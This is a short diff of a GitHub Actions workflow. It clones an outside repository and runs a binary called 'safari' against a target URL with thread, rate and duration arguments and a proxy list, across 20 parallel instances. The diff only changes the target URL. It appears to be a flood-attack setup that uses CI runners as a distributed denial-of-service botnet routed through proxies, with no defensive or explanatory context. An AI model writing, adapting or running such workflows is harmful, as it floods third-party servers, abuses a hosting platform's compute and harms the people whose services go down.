@@ -25,7 +25,7 @@ jobs:
         git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
         cd cuddly-octo-bassoon
         chmod +x safari
-        ./safari https://c1.dstatbot.win/npRurOot 400 10000 8000 proxies.txt --cdn --raw
+        ./safari https://c3.dstatbot.win/Z3TE0AXw 400 10000 8000 proxies.txt  --raw
       env:
         INSTANCE_NUMBER: ${{ matrix.instance }}
         TOTAL_INSTANCES: 20
